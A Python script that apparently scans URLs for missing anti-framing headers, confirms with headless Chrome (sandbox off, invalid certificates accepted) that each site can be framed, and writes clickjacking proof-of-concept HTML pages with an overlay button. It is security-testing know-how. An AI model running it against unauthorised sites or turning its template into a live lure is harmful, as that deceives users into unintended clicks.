#!/usr/bin/env python3
import argparse
import os
import time
import configparser
import sys
import uuid
import tempfile
from pathlib import Path
from urllib.parse import urlparse
import requests
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import (
    WebDriverException,
    NoSuchFrameException,
    TimeoutException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from tqdm import tqdm

POC_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        body {{
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }}
        .description {{
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }}
        h2 {{
            color: #000;
        }}
        p {{
            color: rgb(146, 83, 83);
            font-weight: bold;
        }}
        .container {{
            position: relative;
            width: 80%;
            max-width: 900px;
            height: 600px;
            border: 2px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
        }}
        .container iframe {{
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }}
        .overlay-button {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            background-color: #ff5722;
            border: none;
            cursor: pointer;
            opacity: 1;
            z-index: 10;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}
        .overlay-button:hover {{
            background-color: #e64a19;
        }}
    </style>
</head>
<body>
    <div class="description">
        <h2>Clickjacking Vulnerability POC</h2>
        <p>This proof‑of‑concept demonstrates a clickjacking vulnerability, enabling unauthorized interaction and data access.</p>
    </div>
    <div class="container">
        <iframe src="{victim_url}"></iframe>
        <button class="overlay-button">Click here</button>
    </div>
</body>
</html>
"""

def read_config():
    cfg = configparser.ConfigParser()
    cfg.read("config.ini")
    return cfg.get("settings", "webdriver_path", fallback="chromedriver")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Clickjacking POC tester with redirect handling")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Specify a single URL to test")
    group.add_argument("-f", "--file-list", help="Specify a file containing a list of URLs (one per line)")
    parser.add_argument("-o", "--output", default="output/", help="Output directory (default: output/)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-d", "--driver-path", help="Override path to ChromeDriver")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use (default: 1)")
    return parser.parse_args()

def resolve_redirect(url):
    try:
        r = requests.head(url, allow_redirects=True, timeout=10)
        final = r.url
        if final.rstrip("/") != url.rstrip("/"):
            return final
    except requests.RequestException:
        pass
    return url

def is_framable(url):
    try:
        r = requests.get(url, timeout=10, allow_redirects=False)
        if 300 <= r.status_code < 400:
            return False
        xfo = r.headers.get("X-Frame-Options", "").lower()
        csp = r.headers.get("Content-Security-Policy", "").lower()
        return not ("deny" in xfo or "sameorigin" in xfo or "frame-ancestors" in csp)
    except requests.RequestException:
        return False

def generate_and_save_poc(dest_url, orig_url, output_dir):
    domain = urlparse(dest_url).netloc.replace("www.", "")
    html = POC_TEMPLATE.format(victim_url=dest_url)
    path = Path(output_dir) / domain
    path.mkdir(parents=True, exist_ok=True)

    filename = f"poc_{domain}.html"
    if orig_url and orig_url.rstrip("/") != dest_url.rstrip("/"):
        filename = f"poc_redirect_{domain}.html"

    poc_file = path / filename
    poc_file.write_text(html, encoding="utf-8")
    return poc_file

def test_clickjacking(victim_url, driver_path, visited=None):
    if visited is None:
        visited = set()
    if victim_url in visited or len(visited) >= 3:
        return False
    visited.add(victim_url)

    if not is_framable(victim_url):
        return False

    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--ignore-certificate-errors")
    caps = DesiredCapabilities.CHROME.copy()
    caps["acceptInsecureCerts"] = True
    for cap, val in caps.items():
        opts.set_capability(cap, val)

    driver = webdriver.Chrome(service=ChromeService(executable_path=driver_path), options=opts)
    tmp = tempfile.NamedTemporaryFile("w", suffix=".html", delete=False)
    tmp.write(POC_TEMPLATE.format(victim_url=victim_url))
    tmp.close()

    try:
        driver.get(f"file://{tmp.name}")
        iframe = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "iframe")))
        driver.switch_to.frame(iframe)

        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                current = driver.execute_script("return window.location.href")
            except WebDriverException:
                return False

            if current.rstrip("/") != victim_url.rstrip("/"):
                driver.quit()
                return test_clickjacking(current, driver_path, visited)

            time.sleep(0.2)

        return True

    except (TimeoutException, NoSuchFrameException, WebDriverException):
        return False

    finally:
        driver.quit()
        try:
            os.unlink(tmp.name)
        except OSError:
            pass

def process_url(url, output_dir, driver_path, verbose):
    orig = url
    dest = resolve_redirect(orig)
    vuln = test_clickjacking(dest, driver_path)
    if vuln:
        generate_and_save_poc(dest, orig, output_dir)
        if orig.rstrip("/") != dest.rstrip("/"):
            return f"[VULNERABLE] {dest} [redirected from] {orig}"
        return f"[VULNERABLE] {dest}"
    return None

def main():
    args = parse_arguments()
    driver = args.driver_path or read_config()
    Path(args.output).mkdir(exist_ok=True)
    targets = [args.url] if args.url else Path(args.file_list).read_text().split()

    found = False
    for url in targets:
        result = process_url(url.strip(), args.output, driver, args.verbose)
        if result:
            print(result)
            found = True

    if not found:
        print("No vulnerable sites found.")

if __name__ == "__main__":
    main()
